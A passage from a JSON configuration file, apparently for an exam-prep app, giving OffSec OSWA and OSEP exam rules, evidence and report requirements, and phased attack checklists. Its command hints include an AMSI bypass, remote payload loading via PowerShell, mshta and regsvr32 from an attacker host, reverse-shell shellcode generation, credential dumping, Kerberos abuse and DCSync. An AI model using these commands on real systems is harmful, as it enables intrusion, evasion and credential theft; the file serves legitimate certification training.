     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Proof value submitted in the Exam Control Panel before the exam ends — separate from the report, and the panel gives no correctness feedback.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "A screenshot of the proof value included in the documentation. Failure to provide the appropriate proof files in a screenshot for each machine results in ZERO points for that target.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswa-1-proof",
     "requirement": "Obtained through a shell: screenshot the contents of the proof file using cat or type from its ORIGINAL location.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswa-2-proof",
     "requirement": "Obtained through a shell: screenshot the contents of the proof file using cat or type from its ORIGINAL location.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswa-3-proof",
     "requirement": "Obtained through a shell: screenshot the contents of the proof file using cat or type from its ORIGINAL location.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswa-4-proof",
     "requirement": "Obtained through a shell: screenshot the contents of the proof file using cat or type from its ORIGINAL location.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswa-5-proof",
     "requirement": "Obtained through a shell: screenshot the contents of the proof file using cat or type from its ORIGINAL location.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Per-vulnerability write-up: the method and steps used to find each vulnerability, reproducible by a technically competent reader.",
     "source": "https://www.offensive-security.com/oswa-online/OSWA-Exam-Report.docx",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "OffSec Web Assessor Exam Report — introduction, scope and grading statement",
    "Target <TARGET_IP> — Local.txt / Proof.txt (contents of both files)",
    "Target <TARGET_IP> — Vulnerability 1 (method and steps used to find it)",
    "Target <TARGET_IP> — Vulnerability 2 (method and steps used to find it)",
    "Target <TARGET_IP> — Vulnerability X (repeat per additional vulnerability)",
    "Target <TARGET_IP> — Screenshots (local.txt and proof.txt contents per Control Panel objectives)",
    "Target <TARGET_IP> — Steps (detailed, reproducible methodology)",
    "Additional Items Not Mentioned in the Report"
   ],
   "sources": [
    "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
    "https://help.offsec.com/hc/en-us/articles/7281947451284-OSWA-Exam-FAQ",
    "https://www.offensive-security.com/oswa-online/OSWA-Exam-Report.docx",
    "https://www.offsec.com/courses/web-200/"
   ],
   "unverified": [
    "Metasploit Framework (the free edition) is not explicitly addressed in the OSWA exam guide. The guide bans 'commercial tools or services (Metasploit Pro, Burp Suite Enterprise Edition)' and 'automatic exploitation tools (db_autopwn, browser_autopwn)', and separately permits msfvenom as a payload generator. The safe reading — and the one this preset assumes — is that msfvenom is fine and automated Metasploit exploitation is not, but OffSec has not stated the general framework position in the OSWA guide.",
    "The WEB-200 course page confirms XSS, SQL injection, SSRF, XXE, CSRF, SSTI and CORS are taught but does not publish the full 16-module list, so the phase coverage for directory traversal, file inclusion, command injection, IDOR and authentication bypass reflects standard blackbox web-assessment methodology rather than a quoted syllabus."
   ],
   "kind": "targets",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "osep",
   "name": "OSEP (PEN-300)",
   "icon": "🕶️",
   "tagline": "For the operator on OffSec's 47h45m evasion exam: hit the control-panel objective or 100 points, and prove every step to a grader who was not there.",
   "focus": "evasion",
   "durationMin": 2865,
   "reportHours": 24,
   "passMark": 100,
   "totalPoints": 0,
   "scoringNote": "Each local.txt or proof.txt is worth 10 points (OffSec, OSEP Exam FAQ). You pass one of two ways: complete the objective given on the exam control panel — proven by obtaining secret.txt on the final machine — OR reach at least 100 points. There is no published maximum: OffSec states the number of machines is a deliberate exam secret and that some machines cannot be compromised at all, so totalPoints is 0 and the app should count upward toward the 100-point pass mark rather than toward a fixed denominator. The exam guide also notes points are awarded for partial and complete administrative control and that each machine has its own objectives, so treat the 10-per-flag figure as the floor and read the per-target values in your control panel.",
   "targets": [],
   "phases": [
    {
     "id": "surface",
     "name": "Breach Surface & Ground Rules",
     "goal": "You know the objective verbatim, what leaves the network, and where your first user-driven execution will come from.",
     "items": [
      {
       "label": "Read the control panel objective and paste it into your notes word for word — it is the pass condition, not a hint",
       "hint": ""
      },
      {
       "label": "Record the per-target point values the control panel publishes; that is the only real scoreboard",
       "hint": ""
      },
      {
       "label": "Claim the development VM provided inside the VPN (Visual Studio, Office) before you need to compile under pressure",
       "hint": ""
      },
      {
       "label": "Sweep the reachable perimeter, top ports first, full range in the background",
       "hint": "nmap -sS -Pn -T4 --top-ports 2000 --open -oA scans/perimeter <TARGET_IP>"
      },
      {
       "label": "Full TCP on anything that answers, then version/script the open ports only",
       "hint": "nmap -sT -Pn -p- --min-rate 3000 -oA scans/full <TARGET_IP> && nmap -sCV -p $(cut -d/ -f1 scans/full.gnmap) <TARGET_IP>"
      },
      {
       "label": "Egress test from the first shell you get: which ports and protocols actually reach you",
       "hint": "for p in 53 80 443 8080 8443 4444; do timeout 2 bash -c \"</dev/tcp/<ATTACKER_IP>/$p\" 2>/dev/null && echo \"$p open\"; done"
      },
      {
       "label": "Identify the human-facing intake: webmail, upload portal, support queue, anything that accepts a document",
       "hint": ""
      },
      {
       "label": "Stand up staging and a listener on a port you proved is allowed out",
       "hint": "sudo python3 -m http.server 80"
      }
     ]
    },
    {
     "id": "tradecraft",
     "name": "Payload Tradecraft (build before you need it)",
     "goal": "You have a tested loader that survives the defences on the target, and you never burn a stage by testing it in the wrong place.",
     "items": [
      {
       "label": "Write a C# loader that fetches shellcode at runtime — nothing signature-worthy sits in the binary",
       "hint": "csc.exe /platform:x64 /unsafe /target:exe /out:loader.exe loader.cs"
      },
      {
       "label": "Generate raw x64 shellcode for a handler on an allowed egress port",
       "hint": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f raw -o sc.bin"
      },
      {
       "label": "Encrypt the stage (XOR or AES) and decrypt only into RW memory, then flip to RX — never write RWX",
       "hint": ""
      },
      {
       "label": "Patch AMSI in-process before any .NET or PowerShell stage loads",
       "hint": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
      },
      {
       "label": "Blind ETW for the current process by patching EtwEventWrite in ntdll before you inject",
       "hint": ""
      },
      {
       "label": "Strip the obvious: rename the assembly, fix the entropy, remove default metadata and .NET reactor artefacts",
       "hint": ""
      },
      {
       "label": "Load .NET assemblies reflectively from memory instead of dropping to disk",
       "hint": "$b=(New-Object Net.WebClient).DownloadData('http://<ATTACKER_IP>/l.exe'); [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,[string[]]@()))"
      },
      {
       "label": "Test against the same defence you saw on the target — never upload an exam payload to VirusTotal or any public scanner",
       "hint": ""
      },
      {
       "label": "Keep a clean and a noisy variant; you will want the quiet one after the first alert fires",
       "hint": ""
      }
     ]
    },
    {
     "id": "clientside",
     "name": "Client-Side Execution & Phishing",
     "goal": "A user action turns into your code running, and you can explain in the report exactly why the pretext worked.",
     "items": [
      {
       "label": "Office macro with Win32 API declares for allocation and thread creation — no shell-out, no child process anomaly",
       "hint": ""
      },
      {
       "label": "Remote template injection when macros are blocked in the document itself",
       "hint": ""
      },
      {
       "label": "JScript / WSH chain that loads a .NET assembly in-memory (DotNetToJScript style)",
       "hint": "cscript.exe //E:jscript stage.js"
      },
      {
       "label": "HTA delivery through a signed, permitted binary",
       "hint": "mshta.exe http://<ATTACKER_IP>/p.hta"
      },
      {
       "label": "Container delivery to strip Mark-of-the-Web (ISO / IMG / VHD)",
       "hint": "genisoimage -o deliver.iso -J -r -V DOCS payload_dir/"
      },
      {
       "label": "LNK with a plausible icon pointing at your LOLBin chain",
       "hint": ""
      },
      {
       "label": "Write the pretext: who is sending it, why now, what they expect the user to do",
       "hint": ""
      },
      {
       "label": "Catch the callback and stabilise before the user closes the document",
       "hint": "rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "Screenshot the delivery artefact and the resulting shell — the report has to show the whole chain",
       "hint": ""
      }
     ]
    },
    {
     "id": "allowlist",
     "name": "Application Allow-Listing & Language Mode",
     "goal": "You know exactly what the host will let you execute, and you have a path through it rather than around it.",
     "items": [
      {
       "label": "Pull the effective AppLocker policy and read the rule collections",
       "hint": "Get-AppLockerPolicy -Effective -Xml"
      },
      {
       "label": "Check WDAC / Code Integrity policy state before assuming AppLocker is the whole story",
       "hint": "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard"
      },
      {
       "label": "Check PowerShell language mode — Constrained changes every later decision",
       "hint": "$ExecutionContext.SessionState.LanguageMode"
      },
      {
       "label": "Find a writable directory inside an allowed path rule",
       "hint": "icacls C:\\Windows\\Tasks C:\\Windows\\Temp C:\\Windows\\System32\\spool\\drivers\\color"
      },
      {
       "label": "Execute .NET through InstallUtil when direct execution is blocked",
       "hint": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"
      },
      {
       "label": "MSBuild inline task as a compile-and-run primitive",
       "hint": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml"
      },
      {
       "label": "Scriptlet execution via regsvr32 / rundll32 where those are permitted",
       "hint": "regsvr32.exe /s /n /u /i:http://<ATTACKER_IP>/s.sct scrobj.dll"
      },
      {
       "label": "Escape Constrained Language Mode with a custom runspace or an unmanaged PowerShell host",
       "hint": ""
      },
      {
       "label": "Note which bypass worked and which control it defeated — this is a finding, not just a step",
       "hint": ""
      }
     ]
    },
    {
     "id": "postex",
     "name": "Foothold Post-Exploitation, Injection & Pivot",
     "goal": "You are out of the fragile client-side process, you have credentials, and traffic reaches the segments you cannot route to.",
     "items": [
      {
       "label": "Fingerprint the security stack before you move — services, drivers, and what is actually enforcing",
       "hint": "Get-MpComputerStatus; driverquery /v | findstr /i \"sysmon crowd sentinel cylance carbon elastic\""
      },
      {
       "label": "Migrate into a long-lived, plausible process before the user closes the document",
       "hint": ""
      },
      {
       "label": "Process injection into a legitimate parent — CreateRemoteThread, APC queue, or hollowing depending on what is hooked",
       "hint": ""
      },
      {
       "label": "Harvest credentials without touching lsass.exe directly where EDR is watching handles",
       "hint": "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv"
      },
      {
       "label": "Pull DPAPI-protected browser, RDP and credential-manager secrets",
       "hint": "mimikatz # dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\*"
      },
      {
       "label": "Sweep disk for cleartext: unattend files, GPP XML, config, scripts, KeePass databases",
       "hint": "findstr /si password *.xml *.ini *.config *.txt *.ps1 2>nul"
      },
      {
       "label": "Linux foothold: sudo rules, capabilities, cron, SUID, reusable SSH keys",
       "hint": "sudo -l; getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null"
      },
      {
       "label": "Bypass network filters to reach segmented subnets (DNS or HTTP tunnel, or a port-forward)",
       "hint": "ssh -N -D 1080 <USER>@<TARGET_IP>"
      },
      {
       "label": "Pivot all further tooling through SOCKS rather than dropping tools on the host",
       "hint": "proxychains -q nxc smb <DC_IP>"
      },
      {
       "label": "Collect local.txt now — interactive shell, cat or type from its original path, IP in the same frame",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt & ipconfig"
      },
      {
       "label": "Submit the flag and its hostname in the control panel immediately; do not batch this to the end",
       "hint": ""
      }
     ]
    },
    {
     "id": "adrecon",
     "name": "Domain Situational Awareness",
     "goal": "You have the graph before you touch anything, and you collected it without lighting up the SOC.",
     "items": [
      {
       "label": "Collect BloodHound data through the pivot with the quietest collection method that answers your question",
       "hint": "proxychains -q bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c DCOnly"
      },
      {
       "label": "Prefer LDAP/ADWS enumeration over SMB-heavy session collection when EDR is present",
       "hint": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=corp,DC=com' '(objectClass=user)' sAMAccountName"
      },
      {
       "label": "Map trusts and the direction of each one — the objective often sits across a boundary",
       "hint": "nltest /domain_trusts /all_trusts"
      },
      {
       "label": "Enumerate delegation: unconstrained, constrained, and resource-based",
       "hint": "Get-DomainComputer -Unconstrained -Properties dnshostname; Get-DomainUser -TrustedToAuth"
      },
      {
       "label": "Hunt ACL edges you can abuse: GenericAll, GenericWrite, WriteDACL, WriteOwner, AddKeyCredentialLink",
       "hint": "Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner' }"
      },
      {
       "label": "Enumerate MSSQL service principal names — they are often the lateral path",
       "hint": "setspn -T <DOMAIN> -Q MSSQLSvc/*"
      },
      {
       "label": "Check machine account quota and which computer objects you already control",
       "hint": "Get-DomainObject -Identity '<DOMAIN>' -Properties ms-DS-MachineAccountQuota"
      },
      {
       "label": "Locate the CA, if there is one, before spending hours on Kerberos",
       "hint": "certutil -config - -ping"
      }
     ]
    },
    {
     "id": "kerberos",
     "name": "Kerberos & Delegation Abuse",
     "goal": "You convert graph knowledge into a ticket that impersonates someone who matters.",
     "items": [
      {
       "label": "Kerberoast targeted, high-value SPNs and crack offline rather than roasting everything",
       "hint": "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile spns.hash"
      },
      {
       "label": "AS-REP roast accounts without pre-authentication",
       "hint": "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat"
      },
      {
       "label": "Crack offline on your own box, not on the target",
       "hint": "hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule"
      },
      {
       "label": "Unconstrained delegation: sit on the host and monitor for inbound TGTs",
       "hint": "Rubeus.exe monitor /interval:5 /filteruser:<USER> /nowrap"
      },
      {
       "label": "Coerce authentication to your listener (PrinterBug / PetitPotam class primitives)",
       "hint": "impacket-printerbug <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP> <ATTACKER_IP>"
      },
      {
       "label": "Constrained delegation: S4U2Self then S4U2Proxy to impersonate an administrator to a chosen service",
       "hint": "Rubeus.exe s4u /user:<USER> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_IP> /ptt"
      },
      {
       "label": "Resource-based constrained delegation: write msDS-AllowedToActOnBehalfOfOtherIdentity where you hold write rights",
       "hint": "impacket-rbcd -delegate-from 'ATTACK$' -delegate-to '<TARGET_IP>$' -action write <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>"
      },
      {
       "label": "Shadow credentials via msDS-KeyCredentialLink when a CA is available",
       "hint": "certipy shadow auto -u <USER>@<DOMAIN> -p '<PASSWORD>' -account 'target$' -dc-ip <DC_IP>"
      },
      {
       "label": "AD CS template abuse (ESC1 through ESC8) where the graph points at the PKI",
       "hint": "certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout"
      },
      {
       "label": "Inject the ticket and verify before you build anything on top of it",
       "hint": "export KRB5CCNAME=admin.ccache; klist"
      }
     ]
    },
    {
     "id": "lateral",
     "name": "Lateral Movement & MSSQL Abuse",
     "goal": "You reach hosts you could not route to, using the quietest execution primitive that still works.",
     "items": [
      {
       "label": "Choose the primitive by noise, not by habit: WMI and DCOM before PsExec's service install",
       "hint": "impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET_IP>"
      },
      {
       "label": "WinRM where it is permitted and less scrutinised",
       "hint": "evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>"
      },
      {
       "label": "Pass-the-ticket instead of pass-the-hash when NTLM use is alerting",
       "hint": "export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_IP>"
      },
      {
       "label": "Enumerate reachable MSSQL instances and the identity you authenticate as",
       "hint": "impacket-mssqlclient <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP> -windows-auth"
      },
      {
       "label": "Check for impersonable logins and escalate inside the database first",
       "hint": "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
      },
      {
       "label": "Impersonate sysadmin and confirm you actually got it",
       "hint": "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
      },
      {
       "label": "Walk linked servers into subnets you cannot reach directly",
       "hint": "EXEC sp_linkedservers; EXEC ('SELECT @@version, SYSTEM_USER') AT [<TARGET_IP>];"
      },
      {
       "label": "Chain RPC out through the link where RPC Out is enabled",
       "hint": "EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [<TARGET_IP>];"
      },
      {
       "label": "Fall back to CLR assembly execution where xp_cmdshell is disabled and cannot be re-enabled",
       "hint": "EXEC sp_configure 'clr enabled',1; RECONFIGURE;"
      },
      {
       "label": "Coerce the MSSQL service account to authenticate to you via UNC path",
       "hint": "EXEC master..xp_dirtree '\\\\<ATTACKER_IP>\\share';"
      },
      {
       "label": "Linux lateral movement in the mixed estate: reusable keys, agent sockets, known_hosts breadcrumbs",
       "hint": "ssh-add -l; cat ~/.ssh/known_hosts; ls -la /tmp/ssh-*"
      },
      {
       "label": "Take proof.txt on every host you get administrative control of, the moment you get it",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      }
     ]
    },
    {
     "id": "domain",
     "name": "Domain Compromise & the Objective",
     "goal": "You reach the designated critical asset named in the control panel and hold secret.txt with clean evidence.",
     "items": [
      {
       "label": "Confirm the shortest viable path in BloodHound before burning a one-shot primitive",
       "hint": ""
      },
      {
       "label": "DCSync once you hold replication rights",
       "hint": "impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC_IP> -hashes :<HASH>"
      },
      {
       "label": "Dump NTDS offline where DCSync is blocked or monitored",
       "hint": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
      },
      {
       "label": "Cross the trust into the child or parent domain holding the target asset",
       "hint": "impacket-raiseChild <DOMAIN>/<USER>:'<PASSWORD>'"
      },
      {
       "label": "Forge golden or silver tickets only where it advances the objective, and write it up as a finding",
       "hint": "impacket-ticketer -nthash <HASH> -domain-sid S-1-5-21-XXXX -domain <DOMAIN> Administrator"
      },
      {
       "label": "Reach the critical asset named in the control panel and take secret.txt from its original location",
       "hint": "type C:\\Users\\Administrator\\Desktop\\secret.txt & ipconfig"
      },
      {
       "label": "State in your notes which control-panel objective secret.txt satisfies — the grader reads that claim",
       "hint": ""
      },
      {
       "label": "Reconcile: every flag you hold is submitted in the control panel with its hostname, before the clock stops",
       "hint": ""
      }
     ]
    },
    {
     "id": "report",
     "name": "Evidence Reconciliation & Report",
     "goal": "Submitted, verified by MD5, inside 24 hours, in the order you want it graded.",
     "items": [
      {
       "label": "Order the machines in the report deliberately — OffSec grades them in the order you document them",
       "hint": ""
      },
      {
       "label": "Audit every flag screenshot: interactive shell, cat or type, original path, IP address visible",
       "hint": ""
      },
      {
       "label": "Reject any flag captured through a web shell or RDP — it scores zero; go back and retake it if the clock allows",
       "hint": ""
      },
      {
       "label": "Include modified exploit code in full, with your changes highlighted, the original URL, and why you changed it",
       "hint": ""
      },
      {
       "label": "Unmodified tools: URL only, never pages of pasted source",
       "hint": ""
      },
      {
       "label": "Include the shellcode generation command wherever shellcode appears",
       "hint": ""
      },
      {
       "label": "Export to PDF and check it renders as it did in your editor",
       "hint": ""
      },
      {
       "label": "Archive without a password, exact filename, under 200MB",
       "hint": "7z a OSEP-OS-XXXXX-Exam-Report.7z OSEP-OS-XXXXX-Exam-Report.pdf"
      },
      {
       "label": "Hash locally and compare against what upload.offsec.com shows you",
       "hint": "md5sum OSEP-OS-XXXXX-Exam-Report.7z"
      },
      {
       "label": "Upload and click Submit File — uploading without submitting does not count",
       "hint": ""
      },
      {
       "label": "Confirm the acknowledgement email arrived; check spam before assuming failure",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "banned",
     "text": "Commercial software is prohibited: Metasploit Pro, Cobalt Strike, Core Impact, and Burp Suite Pro. Using a restricted tool voids all points for that target.",
     "enforceable": "banned-tools:metasploit-pro,cobalt-strike,core-impact,burp-suite-pro",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Open-source, community or custom software that performs automatic enumeration and/or exploitation is allowed — Metasploit Community, PowerShell Empire, Covenant, BloodHound and sqlmap are named explicitly. Unlike the OSCP, OSEP has no one-machine Metasploit budget.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Spoofing attacks against ARP, DNS, NBNS or IP are not allowed — they can disrupt the exam environment. Tooling whose default mode poisons LLMNR/NBT-NS/mDNS falls under this.",
     "enforceable": "warn-tools:responder,mitm6,arpspoof,ettercap,bettercap,inveigh",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "AI chatbots and LLMs with direct prompt access (OffSec KAI, ChatGPT, DeepSeek, Gemini and similar) are strictly prohibited and treated as third-party assistance. Tools with incidental built-in AI, such as Notion or Google AI Overview, need not be disabled.",
     "enforceable": "disable:ai-assist",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Proof file contents must be read in a remote interactive shell, with cat or type, from the file's original location. A web shell or an RDP session is not sufficient and scores zero for that target.",
     "enforceable": "evidence:interactive-shell",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Every local.txt, proof.txt and secret.txt must appear in a screenshot alongside the target's IP address (ipconfig, ifconfig or ip addr) AND be submitted in the exam control panel with its hostname before the exam ends. Missing either one scores zero for that target.",
     "enforceable": "evidence:screenshot+control-panel",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "50 machine reverts, resettable once during the exam. Machines revert in groups because of dependencies — click once and wait.",
     "enforceable": "budget:reverts:50;reset:1",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Downloading any application or source code from the exam environment to your local machine is strictly forbidden.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "All OSEP exams are proctored. Every activity must be performed on the host machine running the proctoring application, because the proctor monitors that session.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360049781352-OSEP-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Open book: your own notes, online resources and the OffSec Learning Platform are permitted. Seeking or receiving help from other people — including on Discord — is an academic policy violation.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360049781352-OSEP-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Documentation must be thorough enough for a technically competent reader to replicate every attack step by step, including all commands issued, code written and console output. Insufficient documentation results in reduced or zero points, and the submission is final — missing screenshots will not be requested.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Submit a single PDF named OSEP-OS-XXXXX-Exam-Report.pdf inside a password-free .7z named OSEP-OS-XXXXX-Exam-Report.7z, at most 200MB, to upload.offsec.com within 24 hours of the exam ending, and click Submit File after verifying the MD5.",
     "enforceable": "deadline:report:24h",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Exam machines are graded in the same order in which they are documented in your report — order the report deliberately.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "Flag contents read with cat or type from the file's original location, inside a remote interactive shell. A web shell or RDP session does not count and the target scores zero.",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "The same screenshot must also show the target's IP address, produced by ipconfig, ifconfig or ip addr.",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Flag contents and the hostname they came from must be entered in the exam control panel before the exam clock stops. Control-panel submission and report screenshot are both mandatory.",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Every attack step, command issued, code written and console output documented well enough that a technically competent reader can replicate it step by step.",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Modified exploits and custom code included in full, with changes highlighted, the URL of the original, an explanation of why each change was made, and the command used to generate any shellcode.",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Unmodified exploits and tools referenced by URL only — do not paste unmodified source into the report.",
     "source": "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "secret.txt",
     "requirement": "secret.txt is the proof of the control-panel objective. Capture it under the same interactive-shell rules and state explicitly in the report which objective it satisfies.",
     "source": "https://help.offsec.com/hc/en-us/articles/360049781352-OSEP-Exam-FAQ",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "Cover Page (OSID, exam, date)",
    "Table of Contents",
    "Introduction and Purpose of this Document",
    "Objective (the control-panel objective, quoted)",
    "Requirements",
    "High-Level Summary",
    "Recommendations",
    "Methodology",
    "Information Gathering",
    "Per-Target Walkthrough — ordered as you want it graded",
    "Service Enumeration",
    "Initial Access / Client-Side Vector",
    "Evasion and Defence Bypasses Used",
    "Privilege Escalation",
    "Lateral Movement and Pivoting",
    "Proof of Access — local.txt / proof.txt screenshots with IP",
    "Domain Compromise and Objective Completion — secret.txt",
    "Modified Exploit Code and Custom Tooling (with highlighted changes and original URLs)",
    "Shellcode Generation Commands",
    "House Cleaning",
    "Appendix: Tools and References"
   ],
   "sources": [
    "https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide",
    "https://help.offsec.com/hc/en-us/articles/360049781352-OSEP-Exam-FAQ",
    "https://manage.offsec.com/app/uploads/2026/03/PEN-300_Syllabus.pdf",
    "https://www.offsec.com/courses/pen-300/"
   ],
   "unverified": [
    "Total points available in the exam network. OffSec states the machine count is an exam secret that must be enumerated, and that some machines cannot be compromised at all, so no published maximum exists. totalPoints is therefore 0 and the app should track progress toward the 100-point pass mark instead. Do not display a 'X of Y points' denominator for OSEP.",
    "Number of exam machines. The OSEP Exam FAQ explicitly declines to state it; third-party sites that claim 'six machines' are not citing OffSec. The targets array is therefore empty by design — the user creates targets as they enumerate.",
    "Per-target point values. The FAQ states each local.txt or proof.txt is worth 10 points, while the exam guide separately says points are awarded for partial and complete administrative control and that each machine has its own objectives for full points. The authoritative per-target values are published in the exam control panel when the exam starts; the app should let the user enter them.",
    "Whether the control-panel objective itself carries a point value in addition to secret.txt, or is purely an alternative pass condition. The guide and FAQ describe it only as an alternative route to a pass.",
    "Exact required report section headings. OffSec requires a structured, professional report and links suggested Word / LibreOffice templates, but the exam guide does not mandate headings. The reportSections listed follow OffSec's published template structure plus the content requirements the guide does state, and may be reordered.",
    "Whether ARP/DNS/NBNS spoofing tooling is blocked outright or merely produces zero points. The guide states such attacks 'are not allowed' and that OffSec will not comment on tool status beyond the guide — the app should warn, not hard-block."
   ],
   "notes": [
    "The machine count is deliberately not published and some machines cannot be compromised — so track credential material against hosts, not progress against a target list. The most expensive OSEP failure is re-trying a credential you already tried, on a host you already touched, thirty hours in."
